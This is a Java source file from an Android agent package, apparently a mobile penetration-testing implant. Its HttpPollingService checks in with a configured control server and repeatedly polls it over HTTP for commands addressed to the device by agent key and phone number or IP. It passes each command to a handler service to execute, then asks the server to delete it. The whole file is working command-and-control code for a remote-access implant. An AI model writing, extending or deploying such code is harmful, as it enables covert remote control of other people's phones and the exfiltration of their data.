package com.shevirah.androidagent;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.virgilsecurity.sdk.crypto.Crypto;
import com.virgilsecurity.sdk.crypto.PrivateKey;
import com.virgilsecurity.sdk.crypto.VirgilCrypto;

import android.util.Log;
import static com.shevirah.androidagent.StagerActivity.getPhoneNumberOrIP;
import static com.shevirah.androidagent.Util.isFileExist;
import static com.shevirah.androidagent.Util.logRequest;
import static com.shevirah.androidagent.Util.printExtras;

public class HttpPollingService extends IntentService {

    private static final String TAG = "HttpPollingService";

    public static final String CONNECTED = "connected";
    public static final String HTTP_PREFIX = "http://";
    public static final String DELETELINE_PREFIX = "deleteline=";
    public static final String SPACE = " ";
    public static final String COMMAND_WEB = "WEB";
    public static final String HYPHEN = "-";
    public static final String SLASH = "/";
    public static final char NEW_LINE_CHAR = '\n';
   
    public HttpPollingService() {
        super("HttpPollingService");
    }


    protected void onHandleIntent(Intent intent) {
        try {
            onHandle(intent);
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "onHandleIntent: ", e);
        }
    }

    private void onHandle(Intent intent) {
        // For the very first run Agent creates file named 'connected'
        if (isFileExist(getFilesDir() + SLASH + CONNECTED)) {

	     String myport = getString(R.string.controlport);
	     String baseUrl = "";
	     if (myport.equals("80"))
	     { 
             baseUrl = HTTP_PREFIX + getString(R.string.controlIP) + getString(R.string.controlpath);
	     }
	     else
	     {
		baseUrl = HTTP_PREFIX + getString(R.string.controlIP) + ":" + myport + getString(R.string.controlpath);
	     }
            final String url = baseUrl + getString(R.string.urii);
	    Log.i("AAABBB",url);
	    HttpRequest httpRequest = HttpRequest.get(url);
            String body = httpRequest.body();
            int code = httpRequest.code();
            if (Const.DEBUG) logRequest(TAG, code, body, url);

            if (code != 200) {
                return;
            }


                //    int newLineIndex = body.indexOf(NEW_LINE_CHAR);
                //    if (newLineIndex != -1) {
                //        // read only first single line from response
                  //      body = body.substring(0, newLineIndex);
                   // }
		  String userPhoneId = getApplicationContext().getResources().getString(R.string.agentkey) + HYPHEN + getPhoneNumberOrIP(HttpPollingService.this);
		 Log.i("userphone", userPhoneId);
		  String[] lines = body.split("\n");
      		  for (String line : lines) {
			Log.i("AAA", line);
                    if (line.startsWith(userPhoneId)) {
			 Log.i("AAA", "gothere");
                        // Starting service to execute received command
                        startCommandService(line);
                        // Deleting this command on server side
                        deleteCommandOnServer(baseUrl, line);
                    }
                
		}
               
        } else {
            // This is very first Agent's run, let's do Check In on server.
            String command = getString(R.string.agentkey) + SPACE + CommandHandlerService.ATTACH + SPACE + COMMAND_WEB;
            startCommandService(command);
        }
    }

    private void deleteCommandOnServer(String baseUrl, String bodyToPost) {
        String url = baseUrl + getString(R.string.urij);
        HttpRequest request = HttpRequest.post(url);
        bodyToPost = DELETELINE_PREFIX + bodyToPost;
        request.send(bodyToPost);
        if (Const.DEBUG) logRequest(TAG, request.code(), request.body(), url, bodyToPost);
    }

    private void startCommandService(String body) {
        Intent intent = new Intent(this, CommandHandlerService.class);
        intent.putExtra(CommandHandlerService.EXTRA_MESSAGE, body);
        startService(intent);
    }
}


